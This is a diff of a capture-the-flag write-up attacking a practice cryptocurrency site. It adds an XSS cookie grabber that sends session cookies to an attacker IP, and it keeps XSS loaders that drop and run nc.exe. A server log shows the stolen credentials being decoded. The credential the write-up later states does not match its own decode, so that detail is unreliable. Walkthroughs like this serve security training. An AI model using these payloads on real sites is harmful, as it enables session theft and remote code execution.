@@ -105,7 +105,7 @@ We see that this is a site for users to buy and sell E-Coin cryptocurrency.
 There is a LOGIN and Register link in the top right head of the page.
 We can Register a account and login to discover a mechanism for transfering funds from account to account and a text field to leave a comment.
 
-#### Directory/File Enumeration
+<b>Directory/File Enumeration</b>
 
 First I spider with Burp to crawl the site and build a map.
 
@@ -255,11 +255,24 @@ So now that we formulated our devious masterplan, lets build the tools we need t
 Here we build a simple XSS to drop in the comment box in `transfer.php`
 
 XSS Cookie grabber - gets the session token of the admin and reflects it back to us through the url
-```javascript
-<script>var i=new Image;i.src="http://10.10.14.5/?"+document.cookie;</script>
-```
 
 XSS payload
+```javascript
+<script src=http://10.10.14.40/getcookie.js%3E</script>
+```
+`getcookie.js`
+```
+function getCookie() {
+    var img = document.createElement("img");
+    img.src = "http://10.10.14.40/xss?=" + document.cookie;
+    document.body.appendChild(img);
+}
+getCookie();
+```
+
+
+XSS payload
+
 ```javascript
 //XSS To drop nc.exe:
 <script src=http://10.10.14.5/payd.js%3E</script>
@@ -268,7 +281,7 @@ XSS payload
 <script src=http://10.10.14.5/pay.js%3E</script>
 ```
 
-Dropper
+Dropper - drop's file on remote system through reflected XSS
 
 `payd.js`
 ```javascript
@@ -284,7 +297,7 @@ function paintfunc(){
 paintfunc();
 ```
 
-Execution
+Execution - executes file on remote system through reflected XSS
 
 `pay.js`
 ```javascript
@@ -304,10 +317,43 @@ paintfunc();
 ### Delivery
 
 So from my localbox terminal I use a python module called http.server (used to be simpleHTTPserver)
+Note: be patient it will work in about 2-5 mintues.
 ```bash
-$python -m http.server 8080
-Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+$sudo python -m http.server 80
+[sudo] password for account: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.154 - - [21/Mar/2020 00:21:57] "GET /getcookie.js HTTP/1.1" 200 -
+10.10.10.154 - - [21/Mar/2020 00:21:57] code 404, message File not found
+10.10.10.154 - - [21/Mar/2020 00:21:57] "GET /xss?=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 404 -
 ```
+Ok we got our session token, if we urldecode it in URL then base64 decode it in bash.
+```bash
+┌─[✗]─[account@parrot]─[~/tmp]
+└──╼ $alias urldecode='python3 -c "import sys, urllib.parse as ul; \
+>     print(ul.unquote_plus(sys.argv[1]))"'
+┌─[account@parrot]─[~/tmp]
+└──╼ $urldecode 'YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20'
+YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; 
+┌─[account@parrot]─[~/tmp]
+└──╼ $echo "YWRtaW4=" | base64 -d
+admin
+┌─[account@parrot]─[~/tmp]
+└──╼ $echo "SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20'" | base64 -d
+Hopelessromantic
+```
+Now we got admin creds `admin:Hopelessromanticbase64` for a inital foothold.
+
+### Web Enumeration: Admin Panel
+
+![admin](adminpanel.png)
+ There is a lot of interesting input/output.
+ We see a table for pending transaction approval. The backend of our XSS payload.
+ We know from our inital port scan that their is a MYSQL DB. This is worth testing for SQL injection.
+ Then our next input field takes a numeric value and returns another table. Out of habbit I instantly inserted an escape quote to see if it would return an error, which isignifies a SQLi point.
+ 
+ The the third input field is a application 
+ 
+
 
 
 ### Exploitation
